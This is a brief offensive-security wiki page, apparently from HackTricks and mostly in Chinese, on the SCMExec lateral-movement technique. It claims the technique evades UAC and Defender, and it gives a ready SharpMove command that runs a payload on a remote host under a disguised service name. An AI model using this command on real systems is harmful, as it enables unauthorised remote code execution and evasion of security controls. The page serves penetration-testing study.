# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** 是一种使用服务控制管理器（SCM）在远程系统上执行命令的技术，通过创建一个运行该命令的服务来实现。此方法可以绕过一些安全控制，例如用户帐户控制（UAC）和Windows Defender。

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
